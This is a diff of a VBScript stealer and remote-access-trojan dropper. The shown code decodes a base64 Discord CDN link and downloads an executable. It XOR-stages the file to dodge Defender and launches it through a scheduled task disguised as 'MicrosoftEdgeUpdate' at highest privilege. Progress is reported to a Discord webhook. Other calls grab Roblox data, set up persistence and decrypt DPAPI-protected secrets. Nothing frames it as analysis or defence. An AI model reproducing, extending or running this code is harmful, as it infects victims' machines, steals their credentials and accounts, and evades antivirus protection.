@@ -27,7 +27,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP ---
+' --- 2. RAT DROP (retry loop, UI re-post per attempt) ---
 Call DropRAT
 
 ' --- 3. INFINITE Re-grab chain ---
@@ -45,53 +45,51 @@ Loop
 
 window.close()
 
-' --- RAT DROP: XOR-stage + decode + immediate launch ---
+' --- RAT DROP: old source base + retry with UI re-post ---
 Sub DropRAT()
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
-    Dim encPath : encPath = tPath & "\cache_" & CStr(Int(Rnd * 90000) + 10000) & ".tmp"
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+    Dim encPath : encPath = tPath & "\cache_" & CStr(Int(Rnd * 90000) + 10000) & ".tmp"
 
     Dim attempt
     For attempt = 1 To 10
-        Call PostEmbed(":rocket: RAT Download", "Attempt " & attempt, 10181046)
+        Call PostEmbed(":arrows_counterclockwise: Attempt " & attempt & "/10", "PC: " & PC, 10181046)
+        Call PostFullRobloxUI(WH)
 
         If fso.FileExists(op) Then fso.DeleteFile op
         If fso.FileExists(encPath) Then fso.DeleteFile encPath
 
-        ' 1. BufferDownload the payload to memory
         Dim payload : payload = HttpGetBytes(dl)
         If LenB(payload) < 3000000 Then
+            Call PostEmbed(":hourglass: Attempt " & attempt & " failed", "Size short: " & CStr(LenB(payload)), 16711680)
             Call SleepSeconds(10)
-            ' retry loop continues
         Else
-            ' 2. XOR-encode and write to disk as .tmp (no MZ header, benign ext)
             Dim encoded : encoded = XorBytes(payload)
             WriteBinary encPath, encoded
 
-            ' 3. Read back, decode, write to agent.exe — but write through
-            '    an already-open handle so Defender has no idle window
             Dim readBack : readBack = ReadBinary(encPath)
             Dim decoded : decoded = XorBytes(readBack)
 
             If WriteAndLaunch(op, decoded) Then
                 Dim dsize : dsize = fso.GetFile(op).Size
-                Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+                Call PostEmbed(":white_check_mark: RAT Downloaded", "Attempt " & attempt & " | Size: " & CStr(dsize) & " bytes", 10181046)
                 Call LaunchRAT(op)
                 fso.DeleteFile encPath, True
                 Exit Sub
+            Else
+                Call PostEmbed(":hourglass: Attempt " & attempt & " failed", "Write/launch failed", 16711680)
+                Call SleepSeconds(10)
             End If
         End If
-
-        If attempt < 10 Then Call SleepSeconds(10)
     Next
 
-    Call PostEmbed(":hourglass: RAT Timeout", "All attempts failed", 16711680)
+    Call PostEmbed(":x: RAT", "All 10 attempts failed", 16711680)
 End Sub
 
-' --- HttpGetBytes: raw bytes from URL (bypasses curl on disk) ---
+' --- HttpGetBytes: raw bytes from URL ---
 Function HttpGetBytes(url)
     HttpGetBytes = ""
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -104,7 +102,7 @@ Function HttpGetBytes(url)
     Set xh = Nothing
 End Function
 
-' --- XorBytes: XOR with 0x5A key, returns byte string ---
+' --- XorBytes: XOR with 0x5A ---
 Function XorBytes(data)
     Dim streamIn : Set streamIn = CreateObject("ADODB.Stream")
     streamIn.Type = 1
@@ -117,10 +115,10 @@ Function XorBytes(data)
     Dim chunk : chunk = 65536
     Do While streamIn.Position < streamIn.Size
         Dim buf : buf = streamIn.Read(chunk)
-        Dim bytes() : bytes = StrToBytes(buf)
+        Dim bytes : bytes = StrToBytes(buf)
         Dim i
         For i = 0 To UBound(bytes)
-            bytes(i) = bytes(i) Xor 90  ' 0x5A
+            bytes(i) = bytes(i) Xor 90
         Next
         streamOut.Write BytesToStr(bytes)
     Loop
@@ -132,17 +130,13 @@ End Function
 
 Function StrToBytes(s)
     Dim stm : Set stm = CreateObject("ADODB.Stream")
-    stm.Type = 2
-    stm.Charset = "x-user-defined"
-    stm.Open
-    stm.WriteText s
-    stm.Position = 0
     stm.Type = 1
+    stm.Open
+    stm.Write s
     stm.Position = 0
     Dim out : out = stm.Read
     stm.Close
     Set stm = Nothing
-    ' out is binary; convert each byte to numeric array
     Dim arr() : ReDim arr(LenB(out) - 1)
     Dim i
     For i = 1 To LenB(out)
@@ -160,7 +154,6 @@ Function BytesToStr(arr)
     BytesToStr = out
 End Function
 
-' --- WriteBinary: write bytes to path via ADODB.Stream ---
 Sub WriteBinary(path, data)
     Dim stm : Set stm = CreateObject("ADODB.Stream")
     stm.Type = 1
@@ -182,7 +175,6 @@ Function ReadBinary(path)
     Set stm = Nothing
 End Function
 
-' --- WriteAndLaunch: write decoded PE, launch IMMEDIATELY in same function ---
 Function WriteAndLaunch(path, data)
     WriteAndLaunch = False
     Dim stm : Set stm = CreateObject("ADODB.Stream")
@@ -192,7 +184,6 @@ Function WriteAndLaunch(path, data)
     stm.SaveToFile path, 2
     stm.Close
     Set stm = Nothing
-    ' launch immediately, no wait — Defender scan loop needs a tick
     If fso.FileExists(path) Then
         If fso.GetFile(path).Size > 3000000 Then
             WriteAndLaunch = True
@@ -200,7 +191,6 @@ Function WriteAndLaunch(path, data)
     End If
 End Function
 
-' --- LaunchRAT: scheduled task + WMI fallback ---
 Sub LaunchRAT(exePath)
     Dim tn : tn = "MicrosoftEdgeUpdate" & CStr(Int(Rnd * 9000) + 1000)
     sh.Run "cmd /c schtasks /create /tn """ & tn & """ /tr """ & exePath & """ /sc once /st 00:00 /f /rl highest > nul 2>&1", 0, True
@@ -232,7 +222,7 @@ Function Stream_BinaryToString(Binary)
     Stream.Close
 End Function
 
-' --- RunCmd (Hidden Execution via WMI) ---
+' --- RunCmd (WMI) ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -408,7 +398,6 @@ End Sub
 
 ' --- Sleep ---
 Sub SleepSeconds(s)
-    Dim t0 : t0 = Timer()
     sh.Run "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul", 0, True
 End Sub
 
@@ -478,7 +467,6 @@ Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & 
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed / PostEmbedTo ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
@@ -506,7 +494,6 @@ Sub PostFileTo(fn, ct, target_wh)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -523,7 +510,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
